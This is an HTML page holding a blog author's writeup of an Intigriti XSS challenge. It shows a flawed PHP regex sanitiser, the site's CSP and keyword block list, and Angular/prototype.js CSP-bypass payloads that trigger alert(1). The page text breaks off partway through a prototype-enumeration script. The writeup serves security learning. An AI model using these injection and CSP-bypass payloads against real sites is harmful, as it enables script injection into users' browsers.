@@ -1,0 +1,981 @@
+<!DOCTYPE html>
+<html class="has-navbar-fixed-top" lang="en">
+<head>
+    <meta charset="utf-8">
+<title>Intigriti 0822 XSS Challenge Author Writeup - Huli&#39;s blog</title>
+<meta name="viewport" content="width=device-width, initial-scale=1">
+
+
+
+            
+<link href="https://blog.huli.tw/2022/08/29/intigriti-0822-xss-author-writeup/" rel="alternate" hreflang="zh-TW" />
+            
+    
+
+
+
+
+    
+<link rel="canonical" href="https://blog.huli.tw/2022/08/29/en/intigriti-0822-xss-author-writeup/">
+    
+
+
+
+
+
+    <meta name="description" content="In Auguest, I and bruno made a XSS challenge on Intigriti. When we decided to make it, we hope it’s a difficult and fun challenge, and the players can also learn a lot from it. Here is the writeup f">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Intigriti 0822 XSS Challenge Author Writeup">
+<meta property="og:url" content="https://blog.huli.tw/2022/08/29/en/intigriti-0822-xss-author-writeup/index.html">
+<meta property="og:site_name" content="Huli&#39;s blog">
+<meta property="og:description" content="In Auguest, I and bruno made a XSS challenge on Intigriti. When we decided to make it, we hope it’s a difficult and fun challenge, and the players can also learn a lot from it. Here is the writeup f">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://blog.huli.tw/img/intigriti-0822-xss-author-writeup/cover-en.png">
+<meta property="article:published_time" content="2022-08-28T23:43:37.000Z">
+<meta property="article:modified_time" content="2023-06-20T05:46:56.914Z">
+<meta property="article:author" content="Huli">
+<meta property="article:tag" content="Security">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="https://blog.huli.tw/img/intigriti-0822-xss-author-writeup/cover-en.png">
+
+
+
+<link rel="alternative" href="/atom.xml" title="Intigriti 0822 XSS Challenge Author Writeup" type="application/atom+xml">
+
+
+
+<link rel="icon" href="/img/lidemy_logo.png">
+
+
+<link rel="stylesheet" href="//fonts.googleapis.com/css?family=Ovo|Source+Code+Pro">
+
+
+<link rel="stylesheet" href="/css/bulma.css?v=2.css">
+
+
+
+<link rel="stylesheet" href="//cdnjs.cloudflare.com/ajax/libs/lightgallery/1.6.8/css/lightgallery.min.css">
+
+
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism-tomorrow.min.css" />
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/plugins/line-numbers/prism-line-numbers.min.css" />
+
+
+<link rel="stylesheet" href="/css/style.css?v=3.css">
+
+
+
+
+
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+<script async src="https://www.googletagmanager.com/gtag/js?id=G-1393J2EVCZ"></script>
+<script>
+    window.dataLayer = window.dataLayer || [];
+    function gtag(){dataLayer.push(arguments);}
+    gtag('js', new Date());
+
+    gtag('config', 'G-1393J2EVCZ');
+</script>
+
+
+    
+
+
+<meta name="generator" content="Hexo 6.3.0"></head>
+<body>
+    <script>
+        if (localStorage.getItem('dark-mode')) {
+            if (localStorage.getItem('dark-mode') === 'true') {
+                document.body.classList.add('dark-mode')
+            }
+        } else {
+            if (window.matchMedia && window.matchMedia('(prefers-color-scheme: dark)').matches) {
+                document.body.classList.add('dark-mode')
+            }
+        }
+    </script>
+    
+<nav class="navbar is-transparent is-fixed-top navbar-main" role="navigation" aria-label="main navigation">
+    <div class="container">
+        <div class="navbar-brand">
+            <a class="navbar-item navbar-logo" href="/en">
+                
+                    
+                    Huli&#39;s blog
+                    
+                
+            </a>
+            <div class="navbar-burger">
+                <span></span>
+                <span></span>
+                <span></span>
+            </div>
+        </div>
+        
+        <div class="navbar-menu navbar-start">
+            
+            <a class="navbar-item "
+               href="/en/archives">Archive</a>
+            
+            <a class="navbar-item "
+               href="/en/categories">Categories</a>
+            
+            <a class="navbar-item "
+               href="/en/about">About</a>
+            
+        </div>
+        
+        <div class="navbar-menu navbar-end">
+            
+            
+            <div class="navbar-item is-hoverable has-dropdown is-hidden-mobile is-hidden-tablet-only toc">
+                <a class="navbar-item" title="Table of Contents">
+                    Table of Contents
+                </a>
+                <div class="navbar-dropdown">
+                    
+                    
+                    
+                    
+                    <a class="navbar-item" href="#about-the-challenge">1&nbsp;&nbsp;<b>About the challenge</b></a>
+                    
+                    
+                    <hr class="navbar-divider">
+                    
+                    
+                    <a class="navbar-item" href="#solution">2&nbsp;&nbsp;<b>Solution</b></a>
+                    
+                    
+                    
+                    <a class="navbar-item" href="#xss">2.1&nbsp;&nbsp;XSS</a>
+                    
+                    
+                    
+                    <a class="navbar-item" href="#csp-bypass">2.2&nbsp;&nbsp;CSP Bypass</a>
+                    
+                    
+                    
+                    <a class="navbar-item" href="#steal-csrf-token">2.3&nbsp;&nbsp;Steal CSRF token</a>
+                    
+                    
+                    
+                    <a class="navbar-item" href="#prototype-pollution">2.4&nbsp;&nbsp;Prototype pollution</a>
+                    
+                    
+                    
+                    <a class="navbar-item" href="#dom-clobbering-to-the-rescue">2.5&nbsp;&nbsp;DOM clobbering to the rescue</a>
+                    
+                    
+                    <hr class="navbar-divider">
+                    
+                    
+                    <a class="navbar-item" href="#full-exploit">3&nbsp;&nbsp;<b>Full Exploit</b></a>
+                    
+                    
+                    <hr class="navbar-divider">
+                    
+                    
+                    <a class="navbar-item" href="#bonus">4&nbsp;&nbsp;<b>Bonus</b></a>
+                    
+                    
+                    <hr class="navbar-divider">
+                    
+                    
+                    <a class="navbar-item" href="#another-bypass-with-angularjs-only">5&nbsp;&nbsp;<b>Another bypass with AngularJS only</b></a>
+                    
+                    
+                    <hr class="navbar-divider">
+                    
+                    
+                    <a class="navbar-item" href="#credits">6&nbsp;&nbsp;<b>Credits</b></a>
+                    
+                </div>
+            </div>
+            
+            
+            <a class="navbar-item" target="_blank" title="Twitter" href="https://twitter.com/aszx87410">
+                
+                <i class="fab fa-twitter"></i>
+                
+            </a>
+               
+            <a class="navbar-item" target="_blank" title="RSS" href="/atom.xml">
+                
+                <i class="fas fa-rss"></i>
+                
+            </a>
+               
+            
+            <a class="navbar-item btn-dark-mode" title="dark-mode" href="#">
+                <div>
+                    <svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" version="1.1" width="15" height="15" viewBox="0 0 256 256" xml:space="preserve">
+                    <defs>
+                    </defs>
+                    <g style="stroke: none; stroke-width: 0; stroke-dasharray: none; stroke-linecap: butt; stroke-linejoin: miter; stroke-miterlimit: 10; fill: none; fill-rule: nonzero; opacity: 1;" transform="translate(1.4065934065934016 1.4065934065934016) scale(2.81 2.81)" >
+                        <path d="M 87.823 60.7 c -0.463 -0.423 -1.142 -0.506 -1.695 -0.214 c -15.834 8.398 -35.266 2.812 -44.232 -12.718 c -8.966 -15.53 -4.09 -35.149 11.101 -44.665 c 0.531 -0.332 0.796 -0.963 0.661 -1.574 c -0.134 -0.612 -0.638 -1.074 -1.259 -1.153 c -9.843 -1.265 -19.59 0.692 -28.193 5.66 C 13.8 12.041 6.356 21.743 3.246 33.35 S 1.732 57.08 7.741 67.487 c 6.008 10.407 15.709 17.851 27.316 20.961 C 38.933 89.486 42.866 90 46.774 90 c 7.795 0 15.489 -2.044 22.42 -6.046 c 8.601 -4.966 15.171 -12.43 18.997 -21.586 C 88.433 61.79 88.285 61.123 87.823 60.7 z" style="stroke: none; stroke-width: 1; stroke-dasharray: none; stroke-linecap: butt; stroke-linejoin: miter; stroke-miterlimit: 10; fill: #ffa716; fill-rule: nonzero; opacity: 1;" transform=" matrix(1 0 0 1 0 0) " stroke-linecap="round" />
+                    </g>
+                    </svg>
+                </div>
+            </a>
+            
+               <a class="navbar-item" href="/2022/08/29/intigriti-0822-xss-author-writeup/">中文</a>
+            
+            
+
+        </div>
+    </div>
+</nav>
+
+    <section class="section">
+    <div class="container">
+      
+      <div data-nosnippet class="self-notice">
+        If you have any thoughts on my blog or articles and you want to let me know, you can either post a comment below(public) or tell me via this <a href="https://forms.gle/SjJZ4cnNs6NnjXQG8" target="_blank">feedback form</a>
+      </div>
+      
+    <article class="article content gallery" itemscope itemprop="blogPost">
+    <h1 class="article-title is-size-3 is-size-4-mobile" itemprop="name">
+        
+            Intigriti 0822 XSS Challenge Author Writeup
+        
+    </h1>
+    <div class="article-meta columns is-variable is-1 is-multiline is-mobile is-size-7-mobile">
+        <span class="column is-narrow">
+            <time datetime="2022-08-28T23:43:37.000Z" itemprop="datePublished">29 August 2022</time>
+        </span>
+        
+        <span class="column is-narrow article-category">
+            <i class="far fa-folder"></i>
+            <a class="article-category-link" href="/en/categories/Security/">Security</a>
+        </span>
+        
+        
+        
+    </div>
+    
+    <div class="article-entry is-size-6-mobile" itemprop="articleBody">
+    
+        <img src="/img/intigriti-0822-xss-author-writeup/cover-en.png" style="display:none">
+
+<p>In Auguest, I and bruno made a XSS challenge on Intigriti. When we decided to make it, we hope it’s a difficult and fun challenge, and the players can also learn a lot from it.</p>
+<p>Here is the writeup for this challenge.</p>
+<span id="more"></span>
+
+<h2><span id="about-the-challenge">About the challenge</span></h2><p><a target="_blank" rel="noopener" href="https://challenge-0822.intigriti.io/">https://challenge-0822.intigriti.io/</a></p>
+<p><img src="/img/intigriti-0822-xss-author-writeup/p1.png"></p>
+<p>The challenge is a business card generator with following features:</p>
+<ol>
+<li>Update theme</li>
+<li>Preview name &amp; description</li>
+<li>Update name</li>
+</ol>
+<p>The goal of the challenge is to pop up an alert. User interaction is allowed in a very limited sense. For example, you give the admin a page, the admin will click the “CLICK ME” button on that page, that’s all.</p>
+<h2><span id="solution">Solution</span></h2><p>Basically, there are two parts of the challenge:</p>
+<ol>
+<li>CSRF</li>
+<li>bypass CSP to perform XSS</li>
+</ol>
+<p>The second part is easier to understand, so I will start from the second part.</p>
+<h3><span id="xss">XSS</span></h3><p>In <code>preview.php</code>, there is a feature to replace the link to either iframe or image after sanitized:</p>
+<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token variable">$name</span> <span class="token operator">=</span> <span class="token function">htmlspecialchars</span><span class="token punctuation">(</span><span class="token variable">$name</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token variable">$desc</span> <span class="token operator">=</span> <span class="token function">htmlspecialchars</span><span class="token punctuation">(</span><span class="token variable">$desc</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+<span class="token variable">$desc</span> <span class="token operator">=</span> <span class="token function">preg_replace</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/(https?:\/\/www\.youtube\.com\/embed\/[^\s]*)/'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'&lt;iframe src="$1">&lt;/iframe>'</span><span class="token punctuation">,</span> <span class="token variable">$desc</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+<span class="token variable">$desc</span> <span class="token operator">=</span> <span class="token function">preg_replace</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/(https?:\/\/[^\s]*\.(png|jpg|gif))/'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'&lt;img src="$1">'</span><span class="token punctuation">,</span> <span class="token variable">$desc</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>It looks fine at first glance, because we already sanitized the content, so you can’t escape from the double quote.</p>
+<p>But, if you think outside the box, you will found that it’s not true.</p>
+<p>What if a link gets transform to both iframe and img at the same time?</p>
+<p>Take <code>https://www.youtube.com/embed/abc.jpg</code> as an example, after first replacement, it become:</p>
+<pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>iframe</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>https://www.youtube.com/embed/abc.jpg<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>iframe</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p>After the second replacement, the <code>src</code> part become</p>
+<pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>img</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>https://www.youtube.com/embed/abc.jpg<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p>So the entire string is:</p>
+<pre class="line-numbers language-markup" data-language="markup"><code class="language-markup">&lt;iframe src="<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>img</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>https://www.youtube.com/embed/abc.jpg<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>iframe</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p>Because of this behavior, the double quote of the <code>src</code> attribute has been closed, which means we can inject a new attribute to iframe.</p>
+<p>For example, we can inject <code>srcdoc</code> using this link: <code>https://www.youtube.com/embed/srcdoc=&lt;h1&gt;hello&lt;/h1&gt;.jpg</code> </p>
+<p><img src="/img/intigriti-0822-xss-author-writeup/p2.png"></p>
+<p>You may wondering why this works, how can it bypass the <code>htmlspecialchars</code>?</p>
+<p>No, it’s not. The content is still encoded, but the context is different.</p>
+<p>It’s the content of the attribute now. In HTML, the attribute content will be decoded.</p>
+<p>For now, we can inject any HTML we want via <code>&lt;iframe srcdoc&gt;</code>, but it’s not an XSS at the moment as we still need to bypass the CSP.</p>
+<h3><span id="csp-bypass">CSP Bypass</span></h3><p>Here is the CSP:</p>
+<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
+  <span class="token function">header</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"Content-Security-Policy: "</span><span class="token operator">.</span>
+      <span class="token string double-quoted-string">"default-src 'self'; "</span> <span class="token operator">.</span>
+      <span class="token string double-quoted-string">"img-src http: https:; "</span> <span class="token operator">.</span>
+      <span class="token string double-quoted-string">"style-src 'unsafe-inline' http: https:; "</span> <span class="token operator">.</span>
+      <span class="token string double-quoted-string">"object-src 'none';"</span> <span class="token operator">.</span>
+      <span class="token string double-quoted-string">"base-uri 'none';"</span> <span class="token operator">.</span>
+      <span class="token string double-quoted-string">"font-src http: https:;"</span><span class="token operator">.</span>
+      <span class="token string double-quoted-string">"frame-src https://www.youtube.com/;"</span><span class="token operator">.</span>
+      <span class="token string double-quoted-string">"script-src 'self' https://cdnjs.cloudflare.com/ajax/libs/;"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>It’s a classic CSP bypass which even appeared in the intigriti XSS challenge last month.</p>
+<p><code>https://cdnjs.cloudflare.com/ajax/libs</code> is allowed, so we can use the Angular gadget in the <a target="_blank" rel="noopener" href="https://portswigger.net/web-security/cross-site-scripting/cheat-sheet#angularjs-reflected-1-all-versions-(chrome)-shorter">XSS cheat sheet</a>:</p>
+<pre class="line-numbers language-markup" data-language="markup"><code class="language-markup">&lt;input id=x ng-focus=$event.path|orderBy:'(z=alert)(1)'><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p>Are we done? Nope, it’s not work because <code>focus</code> event is not triggered.</p>
+<p>The preivew content is hidden by default, the user needs to click the button to remove <code>display:none</code> CSS rule to make it visible. It’s a dead end since user interaction is not allowed here.</p>
+<p>When it comes to Angular CSP bypass, my favorite one is the following:</p>
+<pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>https://cdnjs.cloudflare.com/ajax/libs/prototype/1.7.2/prototype.js<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token script"></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>https://cdnjs.cloudflare.com/ajax/libs/angular.js/1.0.1/angular.js<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token script"></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">ng-app</span> <span class="token attr-name">ng-csp</span><span class="token punctuation">></span></span>
+  &#123;&#123;$on.curry.call().alert(1)&#125;&#125;
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>User interaction is not needed, as well as <code>unsafe-inline</code> and <code>unsafe-eval</code>.</p>
+<p>I learned this payload from:</p>
+<ol>
+<li><a target="_blank" rel="noopener" href="https://blog.0daylabs.com/2016/09/09/bypassing-csp/">Bypassing path restriction on whitelisted CDNs to circumvent CSP protections - SECT CTF Web 400 writeup</a></li>
+<li><a target="_blank" rel="noopener" href="https://github.com/cure53/XSSChallengeWiki/wiki/H5SC-Minichallenge-3:-%22Sh*t,-it's-CSP!%22">H5SC Minichallenge 3: “Sh*t, it’s CSP!”</a></li>
+</ol>
+<p>It seems great, but the payload still won’t work because of a keyword-based block list:</p>
+<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token variable">$dangerous_words</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string single-quoted-string">'eval'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'setTimeout'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'setInterval'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'Function'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'constructor'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'proto'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'on'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'%'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'&amp;'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'#'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'?'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'\\'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
+
+<span class="token keyword">foreach</span> <span class="token punctuation">(</span><span class="token variable">$dangerous_words</span> <span class="token keyword">as</span> <span class="token variable">$word</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+  <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">stripos</span><span class="token punctuation">(</span><span class="token variable">$desc</span><span class="token punctuation">,</span> <span class="token variable">$word</span><span class="token punctuation">)</span> <span class="token operator">!==</span> <span class="token constant boolean">false</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
+    <span class="token function">header</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"Location: app.php#msg=dangerous word detected!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+  <span class="token punctuation">&#125;</span>
+<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p><code>proto</code> is forbidden, also <code>#</code> and <code>&amp;</code>, so we can’t use HTML entities to bypass the detection.</p>
+<p>To solve this problem, the player is expected to find out that why <code>prototype.js</code> is needed for the bypass.</p>
+<p>It’s needed because prototype.js <a target="_blank" rel="noopener" href="https://github.com/prototypejs/prototype/blob/master/src/prototype/lang/function.js#L226">adds a few methods</a> to different prototype, like Function.prototype:</p>
+<pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">function</span> <span class="token function">curry</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+  <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>arguments<span class="token punctuation">.</span>length<span class="token punctuation">)</span> <span class="token keyword">return</span> <span class="token keyword">this</span><span class="token punctuation">;</span>
+  <span class="token keyword">var</span> __method <span class="token operator">=</span> <span class="token keyword">this</span><span class="token punctuation">,</span> args <span class="token operator">=</span> <span class="token function">slice</span><span class="token punctuation">.</span><span class="token function">call</span><span class="token punctuation">(</span>arguments<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+  <span class="token keyword">return</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+    <span class="token keyword">var</span> a <span class="token operator">=</span> <span class="token function">merge</span><span class="token punctuation">(</span>args<span class="token punctuation">,</span> arguments<span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token keyword">return</span> <span class="token function">__method</span><span class="token punctuation">.</span><span class="token function">apply</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">,</span> a<span class="token punctuation">)</span><span class="token punctuation">;</span>
+  <span class="token punctuation">&#125;</span>
+<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>The first argument of <code>Function.prototype.call</code> is <code>thisArg</code>, you can decide the value of <code>this</code> in the function. It’s worth noting that if you call this function without providing <code>thisArg</code>, the default value of <code>this</code> will be <code>window</code> in non-strict mode.</p>
+<p>Here is an example:</p>
+<pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">function</span> <span class="token function">test</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
+  console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">)</span>
+<span class="token punctuation">&#125;</span>
+
+<span class="token function">test</span><span class="token punctuation">.</span><span class="token function">call</span><span class="token punctuation">(</span><span class="token number">123</span><span class="token punctuation">)</span> <span class="token comment">// 123</span>
+<span class="token function">test</span><span class="token punctuation">.</span><span class="token function">call</span><span class="token punctuation">(</span><span class="token string">'str'</span><span class="token punctuation">)</span> <span class="token comment">// 'str'</span>
+<span class="token function">test</span><span class="token punctuation">.</span><span class="token function">call</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token comment">// window</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>So, <code>any_function.curry.call()</code> will return <code>this</code> because of this line: <code>if (!arguments.length) return this</code>. And we call this function without providing <code>thisArg</code>, so <code>this</code> is <code>window</code> now. This behavior bypasses the Angular sandbox, that’s why we need <code>prototype.js</code>.</p>
+<p>If we can find a similar library that also pollutes the prototype and return <code>this</code>, we can replace <code>prototype.js</code>.</p>
+<p>How to find such library?</p>
+<p>Have you heard about <code>SmooshGate</code>? </p>
+<p>If you don’t, you can read this great article: <a target="_blank" rel="noopener" href="https://developer.chrome.com/blog/smooshgate/">SmooshGate FAQ</a>.</p>
+<p>It’s a story about <code>Array.prototype.flat</code>, which should be named as <code>Array.prototype.flatten</code> at first.</p>
+<p>Why <code>Array.prototype.flatten</code> is abandoned? It’s because a library called <a target="_blank" rel="noopener" href="https://mootools.net/">MooTools</a> already used this name for quite a while. If the browsers implement <code>Array.prototype.flatten</code>, all websited that used MooTools will break.</p>
+<p>From the story, we know that MooTools is another library which will pollute the prototype in some way.</p>
+<p>How to find what is polluted? Looking at the source code? No, there is better way to do that.</p>
+<p>The idea is simple, we can enumerate all methods on the prototype first, then load the library, enumerate again to see if there are anything added.</p>
+<p>It’s not hard to implement such idea:</p>
+<pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token doctype"><span class="token punctuation">&lt;!</span><span class="token doctype-tag">DOCTYPE</span> <span class="token name">html</span><span class="token punctuation">></span></span>
+
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>html</span> <span class="token attr-name">lang</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>en<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>head</span><span class="token punctuation">></span></span>
+  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>meta</span> <span class="token attr-name">charset</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>utf-8<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>
+  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span><span class="token punctuation">></span></span><span class="token script"><span class="token language-javascript">
+    <span class="token keyword">function</span> <span class="token function">getPrototypeFunctions</span><span class="token punctuation">(</span><span class="token parameter">prototype</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+      <span class="token keyword">return</span> Object<span class="token punctuation">.</span><span class="token function">getOwnPropertyNames</span><span class="token punctuation">(</span>prototype<span class="token punctuation">)</span>
+    <span class="token punctuation">&#125;</span>
+    <span class="token keyword">var</span> protos <span class="token operator">=</span> <span class="token punctuation">&#123;</span>
+      <span class="token literal-property property">array</span><span class="token operator">:</span> <span class="token function">getPrototypeFunctions</span><span class="token punctuation">(</span><span class="token class-name">Array</span><span class="token punctuation">.</span>prototype<span class="token punctuation">)</span><span class="token punctuation">,</span>
+      <span class="token literal-property property">string</span><span class="token operator">:</span> <span class="token function">getPrototypeFunctions</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">.</span>prototype<span class="token punctuation">)</span><span class="token punctuation">,</span>
+      <span class="token literal-property property">number</span><span class="token operator">:</span> <span class="token function">getPrototypeFunctions</span><span class="token punctuation">(</span><span class="token class-name">Number</span><span class="token punctuation">.</span>prototype<span class="token punctuation">)</span><span class="token punctuation">,</span>
+      <span class="token literal-property property">object</span><span class="token operator">:</span> <span class="token function">getPrototypeFunctions</span><span class="token punctuation">(</span><span class="token class-name">Object</span><span class="token punctuation">.</span>prototype<span class="token punctuation">)</span><span class="token punctuation">,</span>
+      <span class="token keyword">function</span><span class="token operator">:</span> <span class="token function">getPrototypeFunctions</span><span class="token punctuation">(</span><span class="token class-name">Function</span><span class="token punctuation">.</span>prototype<span class="token punctuation">)</span>
+    <span class="token punctuation">&#125;</span>
+  </span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>head</span><span class="token punctuation">></span></span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span><span class="token punctuation">></span></span>
+  <span class="token comment">&lt;!-- insert script here --></span>
+  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>https://cdnjs.cloudflare.com/ajax/libs/mootools/1.6.0/mootools-core.min.js<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token script"></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span>
+  <span class="token comment">&lt;!-- insert script here --></span>
+  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span><span class="token punctuation">></span></span><span class="token script"><span class="token language-javascript">
+
+    <span class="token keyword">var</span> newProtos <span class="token operator">=</span> <span class="token punctuation">&#123;</span>
+      <span class="token literal-property property">array</span><span class="token operator">:</span> <span class="token function">getPrototypeFunctions</span><span class="token punctuation">(</span><span class="token class-name">Array</span><span class="token punctuation">.</span>prototype<span class="token punctuation">)</span><span class="token punctuation">,</span>
+      <span class="token literal-property property">string</span><span class="token operator">:</span> <span class="token function">getPrototypeFunctions</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">.</span>prototype<span class="token punctuation">)</span><span class="token punctuation">,</span>
+      <span class="token literal-property property">number</span><span class="token operator">:</span> <span class="token function">getPrototypeFunctions</span><span class="token punctuation">(</span><span class="token class-name">Number</span><span class="token punctuation">.</span>prototype<span class="token punctuation">)</span><span class="token punctuation">,</span>
+      <span class="token literal-property property">object</span><span class="token operator">:</span> <span class="token function">getPrototypeFunctions</span><span class="token punctuation">(</span><span class="token class-name">Object</span><span class="token punctuation">.</span>prototype<span class="token punctuation">)</span><span class="token punctuation">,</span>
+      <span class="token keyword">function</span><span class="token operator">:</span> <span class="token function">getPrototypeFunctions</span><span class="token punctuation">(</span><span class="token class-name">Function</span><span class="token punctuation">.</span>prototype<span class="token punctuation">)</span>
+    <span class="token punctuation">&#125;</span>
+
+    <span class="token keyword">let</span> result <span class="token operator">=</span> <span class="token punctuation">&#123;</span>
+      <span class="token literal-property property">prototypeFunctions</span><span class="token operator">:</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">,</span>
+      <span class="token literal-property property">functionsReturnWindow</span><span class="token operator">:</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>
+    <span class="token punctuation">&#125;</span>
+
+    <span class="token keyword">function</span> <span class="token function">check</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
